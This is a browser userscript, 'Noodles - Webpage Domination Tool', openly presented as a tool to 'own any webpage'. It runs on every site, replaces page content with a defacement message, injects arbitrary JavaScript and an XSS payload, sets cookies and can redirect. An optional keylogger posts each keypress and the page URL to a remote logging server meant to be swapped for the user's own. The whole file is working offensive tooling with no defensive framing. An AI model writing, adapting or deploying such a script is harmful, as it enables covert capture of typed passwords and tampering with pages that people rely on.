// ==UserScript==
// @name Noodles - Webpage Domination Tool
// @namespace http://noodles.local/
// @version 1.337
// @description Own any webpage with style. Deface, redirect, or inject. Includes advanced XSS bypass and keylogging.
// @author TheBlackHatNoRemorse | Edited By Noodles Automatic
// @match *://*/*
// @grant GM_setValue
// @grant GM_getValue
// @grant GM_addStyle
// @grant GM_deleteValue
// @grant GM_registerMenuCommand
// @grant GM_xmlhttpRequest
// @run-at document-start
// ==/UserScript==

(function() {
    'use strict';

    const storageKeyPrefix = 'noodles_defacement_';
    const logServerURL = 'http://noodles.local/logs'; // Replace with your logging server

    const getConfig = () => {
        return {
            title: GM_getValue(storageKeyPrefix + 'title', 'Owned by Noodles!'),
            message: GM_getValue(storageKeyPrefix + 'message', 'This site is ours now.'),
            bgColor: GM_getValue(storageKeyPrefix + 'bgColor', '#000000'),
            textColor: GM_getValue(storageKeyPrefix + 'textColor', '#00ff00'),
            font: GM_getValue(storageKeyPrefix + 'font', 'monospace'),
            fontSize: GM_getValue(storageKeyPrefix + 'fontSize', '32px'),
            redirectURL: GM_getValue(storageKeyPrefix + 'redirectURL', ''),
            imageURL: GM_getValue(storageKeyPrefix + 'imageURL', ''),
            customCSS: GM_getValue(storageKeyPrefix + 'customCSS', ''),
            enableAnimation: GM_getValue(storageKeyPrefix + 'enableAnimation', true),
            jsInjection: GM_getValue(storageKeyPrefix + 'jsInjection', ''),
            elementRemoval: GM_getValue(storageKeyPrefix + 'elementRemoval', ''),
            cookies: JSON.parse(GM_getValue(storageKeyPrefix + 'cookies', '[]')),
            xssPayload: GM_getValue(storageKeyPrefix + 'xssPayload', '<script>alert("XSS by Noodles");</script>'),
            keyloggerEnabled: GM_getValue(storageKeyPrefix + 'keyloggerEnabled', false)
        };
    };

    let defacementConfig = getConfig();

    const applyDefacement = () => {
        document.title = defacementConfig.title;
        document.documentElement.innerHTML = '';
        document.body = document.createElement('body');

        const styles = `
            body {
                background-color: ${defacementConfig.bgColor} !important;
                color: ${defacementConfig.textColor} !important;
                font-family: ${defacementConfig.font} !important;
                font-size: ${defacementConfig.fontSize} !important;
                text-align: center !important;
                padding: 50px !important;
            }
            img {
                max-width: 500px !important;
                max-height: 500px !important;
            }
            ${defacementConfig.enableAnimation ? `
            @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            body {
                animation: fadeIn 2s;
            }
            ` : ''}
            ${defacementConfig.customCSS}
        `;

        GM_addStyle(styles);

        const messageElement = document.createElement('div');
        messageElement.textContent = defacementConfig.message;
        document.body.appendChild(messageElement);

        if (defacementConfig.imageURL) {
            const imageElement = document.createElement('img');
            imageElement.src = defacementConfig.imageURL;
            document.body.appendChild(imageElement);
        }

        if (defacementConfig.redirectURL) {
            window.location.href = defacementConfig.redirectURL;
        }

        if (defacementConfig.jsInjection) {
            try {
                const script = document.createElement('script');
                script.innerHTML = defacementConfig.jsInjection;
                document.body.appendChild(script);
            } catch (e) {
                console.error('Noodles: JS Injection Failed:', e);
                logError('JS Injection Failed: ' + e.message);
            }
        }

         if (defacementConfig.elementRemoval) {
            try {
                const elements = document.querySelectorAll(defacementConfig.elementRemoval);
                elements.forEach(el => el.remove());
            } catch (e) {
                console.error('Noodles: Element Removal Failed:', e);
                 logError('Element Removal Failed: ' + e.message);
            }
        }

        defacementConfig.cookies.forEach(cookie => {
            document.cookie = `${cookie.name}=${cookie.value};domain=${cookie.domain || document.domain};path=${cookie.path || '/'};${cookie.secure ? 'secure;' : ''}${cookie.httpOnly ? 'httpOnly;' : ''}`;
        });

        //Attempt XSS
        try {
            const xssDiv = document.createElement('div');
            xssDiv.innerHTML = defacementConfig.xssPayload;
            document.body.appendChild(xssDiv);
        } catch (e) {
            console.error('Noodles: XSS Failed:', e);
             logError('XSS Failed: ' + e.message);
        }
    };

    const logKeypress = (event) => {
        const keyData = {
            key: event.key,
            code: event.code,
            location: window.location.href,
            timestamp: Date.now()
        };

        GM_xmlhttpRequest({
            method: 'POST',
            url: logServerURL + '/keys',
            headers: {
                'Content-Type': 'application/json'
            },
            data: JSON.stringify(keyData),
            onload: (response) => {
                if (response.status !== 200) {
                    console.error('Noodles: Keylog failed to send:', response.status, response.responseText);
                }
            },
            onerror: (error) => {
                console.error('Noodles: Keylog send error:', error);
            }
        });
    };

    const logError = (message) => {
         const errorData = {
            message: message,
            location: window.location.href,
            timestamp: Date.now()
        };

        GM_xmlhttpRequest({
            method: 'POST',
            url: logServerURL + '/errors',
            headers: {
                'Content-Type': 'application/json'
            },
            data: JSON.stringify(errorData),
            onload: (response) => {
                if (response.status !== 200) {
                    console.error('Noodles: Log failed to send:', response.status, response.responseText);
                }
            },
            onerror: (error) => {
                console.error('Noodles: Log send error:', error);
            }
        });
    }

    const createConfigPanel = () => {
        if (document.getElementById('noodlesDefacementPanel')) return;

        const panel = document.createElement('div');
        panel.id = 'noodlesDefacementPanel';
        panel.style.cssText = `position:fixed;top:0;left:0;background:rgba(30,30,30,0.9);color:#ddd;padding:10px;z-index:10000;font-family: monospace; font-size: 14px; border: 1px solid #555; box-shadow: 2px 2px 5px rgba(0,0,0,0.5);`;

        const createInput = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
            lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const input = document.createElement('input');
            input.type = 'text';
            input.value = defacementConfig[key];
            input.style.width = '300px';
            input.style.backgroundColor = '#444';
            input.style.color = '#ddd';
            input.style.border = '1px solid #777';
            input.addEventListener('change', (e) => {
                GM_setValue(storageKeyPrefix + key, e.target.value);
                defacementConfig = getConfig();
            });
            div.appendChild(lbl);
            div.appendChild(input);
            return div;
        };

        const createTextArea = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const textarea = document.createElement('textarea');
            textarea.value = defacementConfig[key];
            textarea.style.width = '300px';
            textarea.style.height = '100px';
            textarea.style.backgroundColor = '#444';
            textarea.style.color = '#ddd';
            textarea.style.border = '1px solid #777';
            textarea.addEventListener('change', (e) => {
                GM_setValue(storageKeyPrefix + key, e.target.value);
                defacementConfig = getConfig();
            });
            div.appendChild(lbl);
            div.appendChild(textarea);
            return div;
        };

        const createCheckbox = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            checkbox.checked = defacementConfig[key];
            checkbox.addEventListener('change', (e) => {
                GM_setValue(storageKeyPrefix + key, e.target.checked);
                defacementConfig = getConfig();
                if (key === 'keyloggerEnabled') {
                    if (e.target.checked) {
                        document.addEventListener('keypress', logKeypress);
                    } else {
                        document.removeEventListener('keypress', logKeypress);
                    }
                }
            });
            div.appendChild(lbl);
            div.appendChild(checkbox);
            return div;
        };

       const createCookieEditor = () => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = 'Cookies:';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            div.appendChild(lbl);

            const cookieList = document.createElement('div');
            cookieList.id = 'noodlesCookieList';
            cookieList.style.marginBottom = '5px';
            div.appendChild(cookieList);

            const refreshCookieList = () => {
                cookieList.innerHTML = '';
                defacementConfig.cookies.forEach((cookie, index) => {
                    const cookieDiv = document.createElement('div');
                    cookieDiv.style.marginBottom = '2px';
                    cookieDiv.style.padding = '5px';
                    cookieDiv.style.border = '1px solid #777';
                    cookieDiv.style.backgroundColor = '#333';

                    const cookieLabel = document.createElement('span');
                    cookieLabel.textContent = `${cookie.name}=${cookie.value}`;
                    cookieLabel.style.marginRight = '10px';
                    cookieDiv.appendChild(cookieLabel);

                    const deleteButton = document.createElement('button');
                    deleteButton.textContent = 'Delete';
                    deleteButton.style.backgroundColor = '#800';
                    deleteButton.style.color = '#ddd';
                    deleteButton.style.border = 'none';
                    deleteButton.style.cursor = 'pointer';
                    deleteButton.addEventListener('click', () => {
                        defacementConfig.cookies.splice(index, 1);
                        GM_setValue(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                        defacementConfig = getConfig();
                        refreshCookieList();
                    });
                    cookieDiv.appendChild(deleteButton);
                    cookieList.appendChild(cookieDiv);
                });
            };

            refreshCookieList();

            const addCookieButton = document.createElement('button');
            addCookieButton.textContent = 'Add Cookie';
            addCookieButton.style.backgroundColor = '#444';
            addCookieButton.style.color = '#ddd';
            addCookieButton.style.border = 'none';
            addCookieButton.style.cursor = 'pointer';
            addCookieButton.addEventListener('click', () => {
                const newCookie = { name: 'newCookie', value: 'newValue', domain: document.domain, path: '/', secure: false, httpOnly: false };
                defacementConfig.cookies.push(newCookie);
                GM_setValue(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                defacementConfig = getConfig();
                refreshCookieList();
            });
            div.appendChild(addCookieButton);

            return div;
        };


        const refreshButton = document.createElement('button');
        refreshButton.textContent = 'Apply Defacement';
        refreshButton.style.cssText = 'margin-top: 10px; padding: 5px 10px; background: #555; color: #ddd; border: none; cursor: pointer;';
        refreshButton.addEventListener('click', applyDefacement);

        const resetButton = document.createElement('button');
        resetButton.textContent = 'Reset All';
        resetButton.style.cssText = 'margin-top: 10px; margin-left: 10px; padding: 5px 10px; background: #800; color: #ddd; border: none; cursor: pointer;';
        resetButton.addEventListener('click', () => {
            for (const key in defacementConfig) {
                GM_deleteValue(storageKeyPrefix + key);
            }
            defacementConfig = getConfig();
            applyDefacement();
            panel.remove();
            createConfigPanel();
        });

        panel.appendChild(createInput('Title', 'title'));
        panel.appendChild(createInput('Message', 'message'));
        panel.appendChild(createInput('Background Color', 'bgColor'));
        panel.appendChild(createInput('Text Color', 'textColor'));
        panel.appendChild(createInput('Font', 'font'));
        panel.appendChild(createInput('Font Size', 'fontSize'));
        panel.appendChild(createInput('Redirect URL', 'redirectURL'));
        panel.appendChild(createInput('Image URL', 'imageURL'));
        panel.appendChild(createTextArea('Custom CSS', 'customCSS'));
        panel.appendChild(createTextArea('JS Injection', 'jsInjection'));
        panel.appendChild(createInput('Element Removal (querySelector)', 'elementRemoval'));
        panel.appendChild(createTextArea('XSS Payload', 'xssPayload'));
        panel.appendChild(createCheckbox('Enable Animation', 'enableAnimation'));
        panel.appendChild(createCheckbox('Enable Keylogger', 'keyloggerEnabled'));
        panel.appendChild(createCookieEditor());

        panel.appendChild(refreshButton);
        panel.appendChild(resetButton);

        document.body.appendChild(panel);


         const dragPanel = (elmnt) => {
            let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
            const dragMouseDown = (e) => {
                e = e || window.event;
                e.preventDefault();
                pos3 = e.clientX;
                pos4 = e.clientY;
                document.onmouseup = closeDragElement;
                document.onmousemove = elementDrag;
            }

            const elementDrag = (e) => {
                e = e || window.event;
                e.preventDefault();
                pos1 = pos3 - e.clientX;
                pos2 = pos4 - e.clientY;
                pos3 = e.clientX;
                pos4 = e.clientY;
                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
            }

            const closeDragElement = () => {
                document.onmouseup = null;
                document.onmousemove = null;
            }

            panel.onmousedown = dragMouseDown;
        }

        dragPanel(panel);
    };

    GM_registerMenuCommand("Noodles: Toggle Defacement Panel", createConfigPanel);

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            if (!document.getElementById('noodlesDefacementPanel')) {
                 createConfigPanel();
            }
            applyDefacement();
            if (defacementConfig.keyloggerEnabled) {
                document.addEventListener('keypress', logKeypress);
            }
        });
    } else {
        if (!document.getElementById('noodlesDefacementPanel')) {
            createConfigPanel();
        }
        applyDefacement();
        if (defacementConfig.keyloggerEnabled) {
            document.addEventListener('keypress', logKeypress);
        }
    }
})();